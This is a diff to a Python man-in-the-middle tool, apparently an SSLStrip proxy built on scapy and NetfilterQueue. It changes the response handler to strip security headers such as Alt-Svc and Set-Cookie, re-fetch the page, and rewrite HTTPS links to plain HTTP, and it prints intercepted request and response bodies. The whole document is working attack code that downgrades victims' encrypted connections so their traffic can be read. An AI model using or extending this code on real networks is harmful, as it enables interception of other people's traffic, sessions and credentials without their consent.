@@ -50,6 +50,8 @@ import sys
 import threading
 import fcntl
 import struct
+import ssl
+import urllib2
 from time import sleep
 from scapy.all import *
 from netfilterqueue import NetfilterQueue
@@ -83,9 +85,8 @@ class SSLStripRequestHandler(ProxyRequestHandler):
 	if req_body:
 		print "\n[+]Original Body:"
 		print req_body
-	print "\n----------------------------------------------------------------------"
 
-    def response_handler(self, req, req_body, res, res_body):
+    def response_handler(self, req, req_body, res, res_body, scheme, netloc, path):
 	print "\n----------------------------[Response]--------------------------------"
 	if res.headers:
 		modified = False
@@ -108,6 +109,11 @@ class SSLStripRequestHandler(ProxyRequestHandler):
 		except:
 			pass
 		try:
+			del res.headers['Alt-Svc']
+			modified = True
+		except:
+			pass
+		try:
 			del res.headers['Set-Cookie']
 			modified = True
 		except:
@@ -117,14 +123,16 @@ class SSLStripRequestHandler(ProxyRequestHandler):
 			print res.headers
 			print
 	if res_body:
-		modified = False
 		print "\n[+] Original Body:"
 		print res_body
-		if "href" in res_body or "HREF" in res_body:
-			print "\n[+] Modified Body:"
-			print res_body.replace("https://","http://w")
-			print
-			return res_body.replace("https://","http://w")
+		try:
+			fake_body = urllib2.urlopen("{}://{}{}".format(scheme, netloc, path)).read()
+			res_body = fake_body.replace("https://","http://w")
+		except:
+			res_body = res_body.replace("https://","http://w")
+		print "\n[+] Modified Body:"
+		print res_body.replace("https://","http://w")
+		return res_body
 	print "\n----------------------------------------------------------------------"
 
 
